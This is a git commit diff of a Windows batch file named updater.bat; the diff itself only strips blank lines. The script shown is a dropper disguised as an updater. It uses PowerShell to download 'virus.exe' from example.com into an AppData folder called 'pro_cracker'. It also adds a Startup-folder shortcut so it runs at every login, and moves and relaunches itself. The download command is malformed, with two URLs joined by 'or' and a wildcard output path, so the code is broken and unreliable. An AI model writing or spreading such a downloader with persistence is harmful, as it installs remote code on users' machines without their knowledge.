13af75d53dc6977a48b790b64673fd9a65844897
thk34 <103599660+thk34@users.noreply.github.com>
2023-03-26 00:38:30 +0100

    Update updater.bat

--- updater.bat
+++ updater.bat
@@ -1,11 +1,6 @@
 @echo off
-
 md "%APPDATA%\pro_cracker"
-
 powershell -command "Invoke-WebRequest -Uri 'http://example.com/virus_folders/* or http://example.com/virus.exe' -OutFile '%APPDATA%\pro_cracker\*'"
-
 powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\updater.lnk');$s.TargetPath='%APPDATA%\pro_cracker\updater.bat';$s.Save()"
-
 move "%~f0" "%APPDATA%\pro_cracker"
-
 call "%APPDATA%\pro_cracker\updater.bat"
